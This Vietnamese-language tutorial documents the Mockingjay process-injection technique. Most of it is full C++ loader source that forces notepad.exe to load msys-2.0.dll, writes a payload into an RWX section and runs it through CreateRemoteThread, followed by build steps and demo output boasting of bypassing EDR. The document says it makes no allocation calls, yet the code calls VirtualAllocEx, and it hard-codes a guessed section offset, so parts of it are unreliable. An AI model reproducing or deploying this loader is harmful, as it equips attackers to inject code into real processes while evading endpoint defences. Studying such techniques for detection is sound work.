
---

# 📝 [PE 20] Mockingjay (Vulnerable RWX Module Abuse)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Mockingjay (Lạm dụng phân vùng thực thi mặc định của bên thứ ba)** đại diện cho một giải thuật né tránh phòng thủ động (Dynamic Evasion) tinh vi ở cấp độ kiến trúc phần mềm, thuộc nhóm kỹ thuật **Bypass thông qua lỗi cấu hình thuộc tính biên dịch của nhà phát triển (Misconfiguration-based Privilege Abuse / Built-in RWX Parasitism)**.

Trong các mô hình can thiệp bộ nhớ truyền thống, Loader bắt buộc phải triệu hồi các hàm API quản lý không gian ảo như `VirtualAllocEx` hoặc `VirtualProtectEx` để phân bổ hoặc lật cờ bảo vệ của trang nhớ sang trạng thái cho phép thực thi (`PAGE_EXECUTE_READWRITE`). Hành vi này là chỉ dấu Heuristic (Telemetry Indicator) sơ khởi khiến EDR Engine lập tức bắt chặn và cô lập hành vi chéo tiến trình.

Giải thuật Mockingjay hóa giải bài toán sinh tử này bằng chiến thuật **Không triệu hồi API bộ nhớ (Zero Allocation & Zero Protection Taxonomy)**. Loader tiến hành săn tìm và lạm dụng các thư viện DLL của bên thứ ba (văn cảnh thực nghiệm: `msys-2.0.dll` hoặc các mô-đun được biên dịch từ môi trường GCC/MinGW cũ) vốn tồn tại các phân đoạn bộ nhớ mang sẵn quyền **`PAGE_EXECUTE_READWRITE` (RWX)** do lỗi từ khâu cấu hình cờ Linker Flags của nhà phát triển phần mềm. Bằng cách cưỡng bách tiến trình đích nạp mô-đun lỗi này, Loader có thể ghi đè trực tiếp Payload vào hốc nhớ `RWX` hợp pháp có sẵn mà không cần kích hoạt bất kỳ lệnh phân bổ hay lật cờ bộ nhớ nhạy cảm nào lọt lòng OS, vượt qua hàng rào bảo vệ của EDR một cách hoàn hảo.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cảm biến Allocation & Protection Telemetry**: Triệt tiêu 100% các dòng nhật ký hành vi liên quan đến việc khởi tạo hoặc thay đổi đặc quyền trang nhớ trong không gian người dùng.
* **Giải phẫu cấu trúc Section Headers bên thứ ba**: Duyệt và phân tích cấu trúc bảng phân đoạn PE để bóc tách chính xác tọa độ Relative Virtual Address (RVA) của phân vùng `RWX` tĩnh.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong quy chuẩn thiết kế phần mềm chuẩn mực của Microsoft, một tệp thư viện DLL luôn tuân thủ nguyên tắc phân rã đặc quyền: phân đoạn `.text` chứa mã máy mang quyền Đọc/Thực thi (`PAGE_EXECUTE_READ` - RX) và phân đoạn `.data/.bss` chứa biến số mang quyền Đọc/Ghi (`PAGE_READWRITE` - RW). Tuy nhiên, một số mô-đun nhị phân của bên thứ ba do cấu hình sai flag biên dịch hoặc gộp chung các phân đoạn (Section Merging) đã vô tình xuất xưởng một phân vùng Image mang sẵn đặc quyền `RWX`.

Quy trình giải phẫu bản đồ RAM và lạm dụng không gian bộ nhớ mặc định được điều phối ngầm qua 4 giai đoạn logic kịch khung:

```
[Mở Handle] ──> [Ép Notepad nạp msys-2.0.dll lỗi cấu hình vào bộ nhớ ảo]
                     └──> [Định vị tọa độ phân đoạn RWX tĩnh lọt lòng Module Image]
                               └──> [WriteProcessMemory: Bơm Payload trực tiếp không qua bảo vệ]

```

1. **Hợp thức hóa thuộc tính trang nhớ bằng Signed Module**: Loader ép tiến trình đích (văn cảnh thực nghiệm: `notepad.exe`) thực thi lệnh nạp thư viện `msys-2.0.dll` vào không gian ảo của nó. Windows Memory Manager tiếp nhận, ánh xạ DLL này lên RAM dưới dạng một mô-đun Image hợp pháp thuộc loại **`MEM_IMAGE`**. Do phân đoạn `RWX` nằm sẵn inside cấu trúc tệp tin vật lý của DLL trên ổ đĩa thô, phân hệ quản lý bộ nhớ của OS bắt buộc phải cấp đặc quyền `RWX` cho phân vùng đó trên RAM một cách hoàn toàn tự nhiên dựa theo đặc tả cấu trúc của file.
2. **Ký sinh trực tiếp không qua phê duyệt**: Loader sử dụng snapshot danh bạ từ xa để bóc tách địa chỉ Base Address sống của DLL lỗi cấu hình, tính toán tịnh tiến vị trí đến tọa độ của phân đoạn `RWX` tĩnh. Do trang nhớ mục tiêu đã mang sẵn cờ **`PAGE_EXECUTE_READWRITE`**, Loader chỉ việc triệu hồi API `WriteProcessMemory` để đổ mảng byte mã máy Payload vào lòng tiến trình mục tiêu mà **Kernel Windows hoàn toàn không cần thực hiện thao tác lật cờ bảo vệ bảng trang của CPU**. Hệ quả là các cảm biến giám sát cuộc gọi API mập mờ của EDR bị bẻ gãy hoàn toàn.
3. **Phân phối dòng chảy CPU**: Loader phát lệnh sinh luồng thực thi phụ từ xa đâm thẳng vào tọa độ phân đoạn lạm dụng, bốc Payload lên CPU thực hiện tác vụ độc lập vị trí kịch khung.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** và cơ chế tính toán định vị phân đoạn bộ nhớ động chéo tiến trình nhằm triệt tiêu các chỉ dấu chữ ký tĩnh trong Import Address Table (IAT).

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh logic thực thi mở máy tính chéo tiến trình
DWORD WINAPI MockingjayPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối tuyệt đối, né sạch bẫy Import Table
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Hãm luồng ký sinh bảo vệ tháp luồng tiến trình mẹ
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu cấu trúc RAM tìm Base Address của Module cụ thể inside tiến trình đích
PVOID GetRemoteModuleBase(DWORD pid, const std::wstring& moduleName) {
    PVOID baseAddress = NULL;   MODULEENTRY32W me32;   me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, moduleName.c_str()) == 0) { baseAddress = (PVOID)me32.modBaseAddr; break; }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);   return baseAddress;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 20: MOCKINGJAY RWX ABUSE INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << " | Chuan bi tran danh Mockingjay..." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // ─── BƯỚC 1: ÉP TIẾN TRÌNH ĐÍCH NẠP DLL CHỨA VÙNG NHỚ LỖI RWX ───
    std::wstring vulnerableDllPath = L"C:\\Windows\\System32\\msys-2.0.dll"; // Đường dẫn DLL chứa phân đoạn RWX lỗi cấu hình
    SIZE_T pathSize = (vulnerableDllPath.length() + 1) * sizeof(wchar_t);

    LPVOID remotePathBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePathBuffer, vulnerableDllPath.c_str(), pathSize, NULL);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    std::cout << "[*] Dang ep Notepad nap vulnerable msys-2.0.dll de loi dung..." << std::endl;
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);
    if (hLoadThread) {
        WaitForSingleObject(hLoadThread, INFINITE);
        CloseHandle(hLoadThread);
    }
    VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);

    // ─── BƯỚC 2: ĐỊNH VỊ PHÂN ĐOẠN RWX CÓ SẴN CỦA VULNERABLE DLL TỪ XA ───
    PVOID remoteModuleBase = GetRemoteModuleBase(pid, L"msys-2.0.dll");
    if (!remoteModuleBase) {
        std::cerr << "[-] Khong the nap hoac dinh vi msys-2.0.dll! Hay bao dam file co san tai target." << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da bat trung Base Address cua msys-2.0.dll: 0x" << std::hex << remoteModuleBase << std::endl;

    // Giả sử phân đoạn dữ liệu RWX lỗi cấu hình nằm tại offset tĩnh 0x1000 của Module PE sau giải phẫu Header
    PVOID vulnerableRwxSection = (PVOID)((DWORD_PTR)remoteModuleBase + 0x1000); 
    std::cout << "[+] Tim thay hoc nho RWX nguyen ban mac dinh cua DLL: 0x" << std::hex << vulnerableRwxSection << std::endl;

    SIZE_T functionSize = 500;
    // Cấp phát một ô dữ liệu nhỏ mang quyền RW thông thường làm bảng tham số tuyệt đối để độc lập vị trí cho Payload
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemoteData) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ phục vụ ánh xạ chéo biên giới RAM
    THREAD_DATA localData;
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 3: KÝ SINH MÃ MÁY - GHI ĐÈ TRỰC TIẾP KHÔNG QUA KÍCH HOẠT API LẬT CỜ BẢO VỆ ───
    std::cout << "[*] Dang thuc hien ghi de ma may vao phan vung RWX mac dinh..." << std::endl;
    BOOL isAbused = WriteProcessMemory(hProcess, vulnerableRwxSection, (LPCVOID)MockingjayPayload, functionSize, NULL);

    if (!isAbused) {
        std::cerr << "[-] Ghi de vao vung nho Mockingjay that bai!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);   CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Thao tac Mockingjay hoan tat! Payload da nam gon inside long phan vung loi." << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO LUỒNG NATIVE TRÊN PHÂN ĐOẠN LẠM DỤNG ───
    std::cout << "[*] Khoi tao luong tu xa CreateRemoteThread de kich no..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vulnerableRwxSection, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Chờ đồng bộ ngắn giải phóng luồng
        std::cout << "[+] Chien dich Mockingjay da khoi hoa ruc ro!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi tài nguyên dữ liệu và đóng handle bảo an kịch trần hệ thống phẳng sạch
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] Mockingjay RWX Abuse Injection Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để tệp nhị phân xuất bản đạt trạng thái độc lập hoàn toàn, bẻ gãy các lỗi thiếu thư viện DLL phụ thuộc khi vận hành độc lập trên môi trường máy ảo VM sạch hoặc Sandbox kiểm thử chuyên sâu:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến mục cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển thông số sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`**.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình nền `Notepad.exe` trên môi trường Lab, bảo đảm tệp tin nhị phân `msys-2.0.dll` lỗi cấu hình đã được phân phối sẵn, mở PowerShell ngoài đĩa thô thực thi file dự án:

```powershell
PS C:\Workspace\x64\Release> .\PE20_Mockingjay.exe
====================================================
[*] PE 20: MOCKINGJAY RWX ABUSE INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 14212 | Chuan pre tran danh Mockingjay...
[*] Dang ep Notepad nap vulnerable msys-2.0.dll de loi dung...
[+] Da bat trung Base Address cua msys-2.0.dll: 0x00007ffd12a50000
[+] Tim thay hoc nho RWX nguyen ban mac dinh cua DLL: 0x00007ffd12a51000
[*] Dang thuc hien ghi de ma may vao phan vung RWX mac dinh...
[+] Thao tac Mockingjay hoan tat! Payload da nam gon inside long phan vung loi.
[*] Khoi tao luong tu xa CreateRemoteThread de kich no...
[+] Chien dich Mockingjay da khoi hoa ruc ro!

[+] Mockingjay RWX Abuse Injection Completed Successfully!
[*] Nhan phim Enter de don dep va dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm lạm dụng vùng nhớ có sẵn:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):

* Giải thuật can thiệp dứt điểm, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung**!
* Chiến dịch Mockingjay gặt hái thành công mỹ mãn hoàn hảo. Do Loader hoàn toàn không phát ra bất kỳ lệnh triệu hồi API cấp phát hay lật cờ bảo vệ bộ nhớ nhạy cảm nào chéo tiến trình, các cơ chế phát hiện dựa trên Heuristic Telemetry kiểm soát hành vi API allocation của EDR đều bị qua mặt 100%.
* Trang nhớ ký sinh hiển thị thuộc tính **`MEM_IMAGE`** hợp pháp liên kết với Signed DLL, bẻ gãy hoàn toàn các cảm biến trinh sát RAM động đặt tại User-mode một cách tối cao!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Security Joes Research Lab**: *Process Injection Revisited: Meet Mockingjay, a New Evasion Technique bypassing EDRs* - Original Vulnerability Disclosure Whitepaper.
* **Microsoft Windows Memory Specialization**: *Image-Backed Virtual Memory Allocation Protocols (MEM_IMAGE Constants)* - Kernel Subsystem Development.
* **Linker Cấu hình sai thuộc tính**: *GNU Linker (ld) Section Merging Flags and Structural Fragility within Pre-compiled Binaries*.
* **MITRE ATT&CK Framework Matrix**: *Defense Evasion: Process Injection (T1055)* & *Abuse Accessibility Features / Vulnerable Binary Parasitism*.

---
